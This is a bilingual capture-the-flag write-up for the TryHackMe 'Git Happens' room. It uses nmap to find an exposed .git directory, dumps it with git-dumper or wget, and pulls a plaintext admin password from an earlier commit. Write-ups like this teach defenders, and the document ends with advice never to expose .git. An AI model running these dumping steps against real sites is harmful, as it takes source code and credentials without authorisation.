# Git Happens [EASY]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** EASY
* **Tipo / Type:** CTF (Free)
* **Slug:** `githappens`
* **Link:** https://tryhackme.com/room/githappens
* **Sección / Section:** CTF / Máquinas
* **Fuente / Source:** Writeup de Kiran Dawadi (CyberSec Nerds) + AfvanMoopen (GitHub)

---

## Solucionario de Tareas / Task Solutions

> **ES:** Room de nivel principiante que enseña sobre malas configuraciones de control de versiones (git) y errores de desarrolladores que llevan a problemas de seguridad. Un repositorio `.git` expuesto públicamente filtra credenciales en un commit anterior.
> **EN:** Beginner-level room teaching version control (git) misconfigurations and developer mistakes that lead to security issues. A publicly exposed `.git` repository leaks credentials in an earlier commit.

---

### Escaneo / Scanning

```
nmap -sC -sV MACHINE_IP
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-git:
|   10.10.201.254:80/.git/
|     Git repository found!
|_http-title: Super Awesome Site!
```

El escaneo de nmap descubre un repositorio git expuesto en `/.git/`.

---

### Descargar el repositorio / Download the repository

Descargar el repositorio `.git` completo con git-dumper o wget recursivo:

```
/opt/git-dumper/git-dumper.py http://MACHINE_IP:80/.git/ ./git_files
```

O con wget:

```
wget http://MACHINE_IP/.git/ --recursive --no-parent
```

---

### Analizar el repositorio / Analyze the repository

Ver el historial de commits:

```
git log
```

```
commit d0b3578a628889f38c0affb1b75457146a4678e5 (HEAD -> master, tag: v1.0)
Author: Adam Bertrand <hydragyrum@gmail.com>
Date:   Thu Jul 23 22:22:16 2020 +0000
    Update .gitlab-ci.yml

commit 395e087334d613d5e423cdf8f7be27196a360459
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:17:43 2020 +0200
    Made the login page, boss!
```

El commit `395e087` ("Made the login page, boss!") contiene el código de la página de login **antes** de que se ofuscara. Ver el diff de ese commit:

```
git show 395e087334d613d5e423cdf8f7be27196a360459
```

En el `index.html` se encuentran las credenciales en texto claro:

```javascript
if (
  username === "admin" &&
  password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
) {
  document.cookie = "login=1";
  window.location.href = "/dashboard.html";
}
```

---

### Flag

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| Find the Super Secret Password | `Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!` |

> **Flag:** `Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!` — la contraseña del login, encontrada en un commit anterior de git que no fue ofuscado. Se puede usar como flag o para autenticarse (cookie `login=1`).

---

## Metodología / Methodology

1. **Recon:** nmap descubre un repositorio `.git` expuesto en el puerto 80.
2. **Descarga:** usar git-dumper o wget recursivo para descargar el repositorio completo.
3. **Análisis:** `git log` revela un commit "Made the login page, boss!" anterior a la ofuscación.
4. **Foothold:** `git show <commit>` revela las credenciales `admin:Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!` en texto claro.

**Lección:** nunca exponer el directorio `.git` públicamente; los commits anteriores pueden contener secretos que se creían eliminados.

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
